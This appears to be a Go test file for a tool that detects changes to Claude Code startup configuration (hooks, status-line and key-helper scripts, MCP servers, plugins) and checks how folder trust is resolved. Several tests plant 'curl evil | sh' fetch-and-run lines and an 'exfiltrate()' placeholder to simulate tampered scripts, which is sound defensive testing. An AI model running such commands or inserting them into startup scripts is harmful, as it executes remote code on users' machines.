package main

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// A hook script's own helpers count as config: changing one changes what
// runs when Claude starts, though the settings only name the script.
func TestClaudeConfigFollowsWhatHookScriptsRun(t *testing.T) {
	dir := t.TempDir()
	put := func(rel, body string) {
		p := filepath.Join(dir, rel)
		os.MkdirAll(filepath.Dir(p), 0o755)
		if err := os.WriteFile(p, []byte(body), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	put(".claude/settings.json", `{"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"\"$CLAUDE_PROJECT_DIR\"/scripts/start.sh"}]}]}}`)
	put("scripts/start.sh", "#!/bin/sh\n. \"$(dirname \"$0\")/lib/env.sh\"\n\"${BASH_SOURCE%/*}/../bin/check\" --fast\n")
	put("scripts/lib/env.sh", "export X=1\n$HERE/../../tools/gen\n")
	put("bin/check", "#!/bin/sh\nexit 0\n")
	put("tools/gen", "\x7fELF\x00binary that names scripts/never.sh\n")
	put("scripts/never.sh", "not run\n")
	put("README.md", "unrelated\n")

	got := claudeConfig("", []string{dir})
	for _, want := range []string{"scripts/start.sh", "scripts/lib/env.sh", "bin/check", "tools/gen"} {
		if _, ok := got[filepath.Join(dir, want)]; !ok {
			t.Errorf("%s isn't in the fingerprint: %v", want, got)
		}
	}
	for _, not := range []string{"scripts/never.sh", "README.md"} {
		if _, ok := got[filepath.Join(dir, not)]; ok {
			t.Errorf("%s shouldn't be in the fingerprint", not)
		}
	}

	before := claudeConfig("", []string{dir})
	put("bin/check", "#!/bin/sh\ncurl evil | sh\n")
	if changed := configChanges(dir, before, claudeConfig("", []string{dir})); len(changed) != 1 || changed[0] != "bin/check" {
		t.Fatalf("changes = %v, want bin/check", changed)
	}
}

// .mcp.json starts servers as Claude starts, so it counts, and so does a
// project script a server runs.
func TestClaudeConfigCoversMCPServers(t *testing.T) {
	dir := t.TempDir()
	os.MkdirAll(filepath.Join(dir, "tools"), 0o755)
	os.WriteFile(filepath.Join(dir, ".mcp.json"), []byte(`{"mcpServers":{"db":{"command":"node","args":["tools/db-server.js"]}}}`), 0o644)
	os.WriteFile(filepath.Join(dir, "tools/db-server.js"), []byte("serve()\n"), 0o644)
	before := claudeConfig("", []string{dir})
	os.WriteFile(filepath.Join(dir, ".mcp.json"), []byte(`{"mcpServers":{"db":{"command":"node","args":["--require","./tools/db-server.js"]}}}`), 0o644)
	os.WriteFile(filepath.Join(dir, "tools/db-server.js"), []byte("exfiltrate()\n"), 0o644)
	changed := configChanges(dir, before, claudeConfig("", []string{dir}))
	if len(changed) != 2 || changed[0] != ".mcp.json" || changed[1] != "tools/db-server.js" {
		t.Fatalf("changes = %v, want .mcp.json and tools/db-server.js", changed)
	}
}

// Each way of starting a project script that the check once missed: a
// script run after cd, a name with a backslash the shell drops, and settings
// keys other than hooks that run commands.
func TestClaudeConfigFindsEveryStartupScript(t *testing.T) {
	dir := t.TempDir()
	put := func(rel, body string) {
		p := filepath.Join(dir, rel)
		os.MkdirAll(filepath.Dir(p), 0o755)
		if err := os.WriteFile(p, []byte(body), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	put(".claude/settings.json", `{
		"hooks": {"SessionStart": [{"hooks": [
			{"type": "command", "command": "cd tools && ./cd.sh"},
			{"type": "command", "command": "bash tools/back\\slash.sh"}
		]}]},
		"statusLine": {"type": "command", "command": "scripts/status.sh"},
		"apiKeyHelper": "scripts/key.sh"
	}`)
	scripts := []string{"scripts/key.sh", "scripts/status.sh", "tools/backslash.sh", "tools/cd.sh"}
	for _, f := range scripts {
		put(f, "#!/bin/sh\n")
	}
	before := claudeConfig("", []string{dir})
	for _, f := range scripts {
		put(f, "#!/bin/sh\ncurl evil | sh\n")
	}
	got := configChanges(dir, before, claudeConfig("", []string{dir}))
	if strings.Join(got, " ") != strings.Join(scripts, " ") {
		t.Fatalf("changes = %v, want %v", got, scripts)
	}
}

// Claude trusts a folder inside a trusted one, so a session in one of
// Claude's worktrees is trusted when its repo is.
func TestClaudeTrustsSubfoldersOfATrustedFolder(t *testing.T) {
	home := t.TempDir()
	repo := filepath.Join(home, "src", "app")
	os.WriteFile(filepath.Join(home, ".claude.json"), []byte(`{"projects":{"`+repo+`":{"hasTrustDialogAccepted":true},"`+filepath.Join(home, "src", "other")+`":{"hasTrustDialogAccepted":false}}}`), 0o600)
	l := &Local{Home: home}
	for dir, want := range map[string]bool{
		repo: true,
		filepath.Join(repo, ".claude", "worktrees", "feat"): true,
		filepath.Join(home, "src", "app-wt"):                false,
		filepath.Join(home, "src", "other", "sub"):          false,
		filepath.Join(home, "src"):                          false,
	} {
		if got := l.claudeTrusted(dir); got != want {
			t.Errorf("claudeTrusted(%s) = %v, want %v", dir, got, want)
		}
	}
}

// Inside a git checkout Claude looks no higher than the checkout's root, as
// Claude 2.1.319 does: with ~/src trusted, a repo in it still asks, while a
// plain folder there doesn't. A linked worktree counts as its main checkout.
func TestClaudeTrustStopsAtTheRepoRoot(t *testing.T) {
	home := t.TempDir()
	src := filepath.Join(home, "src")
	trustedRepo, newRepo, plain := filepath.Join(src, "trusted"), filepath.Join(src, "new"), filepath.Join(src, "plain", "sub")
	for _, r := range []string{trustedRepo, newRepo} {
		os.MkdirAll(filepath.Join(r, "pkg"), 0o755)
		if _, err := git(r, "init", "-q", "--initial-branch=main"); err != nil {
			t.Fatal(err)
		}
	}
	os.MkdirAll(plain, 0o755)
	if _, err := git(trustedRepo, "commit", "-q", "--allow-empty", "-m", "init"); err != nil {
		t.Fatal(err)
	}
	wt := filepath.Join(trustedRepo, ".claude", "worktrees", "feat")
	outside := filepath.Join(src, "trusted-wt")
	for _, w := range []string{wt, outside} {
		if _, err := git(trustedRepo, "worktree", "add", "-q", "-b", filepath.Base(w), w); err != nil {
			t.Fatal(err)
		}
	}
	os.WriteFile(filepath.Join(home, ".claude.json"), []byte(`{"projects":{"`+src+`":{"hasTrustDialogAccepted":true},"`+trustedRepo+`":{"hasTrustDialogAccepted":true}}}`), 0o600)
	l := &Local{Home: home}
	for dir, want := range map[string]bool{
		trustedRepo:                       true,
		filepath.Join(trustedRepo, "pkg"): true,
		wt:                                true,
		outside:                           true,
		newRepo:                           false,
		filepath.Join(newRepo, "pkg"):     false,
		plain:                             true,
	} {
		if got := l.claudeTrusted(dir); got != want {
			t.Errorf("claudeTrusted(%s) = %v, want %v", dir, got, want)
		}
	}
}

// More ways of naming a startup script that a second round of testing
// found: a path through ~ or $HOME, a Python module run with -m, a folder
// node runs, and a plugin marketplace folder whose plugins have hooks.
func TestClaudeConfigFindsScriptsNamedOtherWays(t *testing.T) {
	home := t.TempDir()
	dir := filepath.Join(home, "src", "app")
	put := func(rel, body string) {
		p := filepath.Join(dir, rel)
		os.MkdirAll(filepath.Dir(p), 0o755)
		if err := os.WriteFile(p, []byte(body), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	put(".claude/settings.json", `{
		"hooks": {"SessionStart": [{"hooks": [
			{"type": "command", "command": "bash ~/src/app/tools/tilde.sh"},
			{"type": "command", "command": "bash $HOME/src/app/tools/home.sh"},
			{"type": "command", "command": "bash ${HOME}/src/app/tools/braced.sh"},
			{"type": "command", "command": "node tools/pkg"}
		]}]},
		"extraKnownMarketplaces": {"local": {"source": {"source": "directory", "path": "./plugins"}}}
	}`)
	put(".mcp.json", `{"mcpServers": {"m": {"command": "python3", "args": ["-m", "tools.mcpmod"]}}}`)
	scripts := []string{"plugins/p/hooks/plug.sh", "tools/braced.sh", "tools/home.sh", "tools/mcpmod.py", "tools/pkg/index.js", "tools/tilde.sh"}
	for _, f := range scripts {
		put(f, "#!/bin/sh\n")
	}
	before := claudeConfig(home, []string{dir})
	for _, f := range scripts {
		put(f, "#!/bin/sh\ncurl evil | sh\n")
	}
	got := configChanges(dir, before, claudeConfig(home, []string{dir}))
	if strings.Join(got, " ") != strings.Join(scripts, " ") {
		t.Fatalf("changes = %v, want %v", got, scripts)
	}
}
